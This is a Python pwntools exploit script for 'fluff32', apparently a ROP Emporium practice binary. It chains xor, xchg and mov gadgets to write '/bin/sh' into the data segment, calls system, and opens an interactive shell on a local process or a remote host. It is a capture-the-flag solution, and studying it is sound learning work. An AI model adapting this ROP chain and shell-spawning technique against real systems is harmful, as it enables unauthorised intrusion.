#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    data_seg = 0x804A028
    system = 0x804865A
    

    '''
    xor     edx, edx
    pop     esi
    mov     ebp, 0CAFEBABEh
    retn
    '''
    clearEdx = 0x8048671

    '''
    xchg    ecx, edx
    pop     ebp
    mov     edx, 0DEFACED0h
    retn
    '''
    xchgEcxEdx = 0x8048689

    '''
    xor     edx, ebx
    pop     ebp
    mov     edi, 0DEADBABEh
    retn
    '''
    xorEdxEbx = 0x804867B

    '''
    mov     [ecx], edx
    pop     ebp
    pop     ebx
    xor     [ecx], bl
    retn
    '''
    gadg5 = 0x8048693

    popebx = 0x080483e1
    
    r.recvuntil("> ")
    buf = ""
    buf += "A" * cyclic_find("laaa")
    buf += p32(clearEdx)
    buf += "AAAA" #pop esi

    buf += p32(popebx)
    buf += p32(data_seg)

    buf += p32(xorEdxEbx)
    buf += "CCCC" #pop ebp #edi will equal 0DEADBABE #EDX should equal 0x804A028

    buf += p32(xchgEcxEdx) #CONTROL pointer to DATA
    buf += "EBPP"

    #----------------------------------------------------------
    buf += p32(clearEdx)
    buf += "AAAA"

    buf += p32(popebx)
    buf += "/bin"

    buf += p32(xorEdxEbx)
    buf += "AAAA"

    #---------------------------------------------------------

    buf +=  p32(gadg5) #mov EDX into DATA
    buf += p32(0)
    buf += p32(0)

    #----------------------------------------------------
    buf += p32(clearEdx)
    buf += "AAAA" #pop esi

    buf += p32(popebx)
    buf += p32(data_seg+4)

    buf += p32(xorEdxEbx)
    buf += "CCCC" 
    
    buf += p32(xchgEcxEdx) #CONTROL pointer to DATA
    buf += "EBPP"
    #-------------------------------------------------------
    buf += p32(clearEdx)
    buf += "AAAA"

    buf += p32(popebx)
    buf += "/sh\x00"

    buf += p32(xorEdxEbx)
    buf += "AAAA"
    
    #--------------------------------------
    buf +=  p32(gadg5) #mov EDX into DATA
    buf += p32(0)
    buf += p32(0)
    #---------------------------------------
    buf += p32(system)
    buf += p32(data_seg)



    r.sendline(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./fluff32"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804864B",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

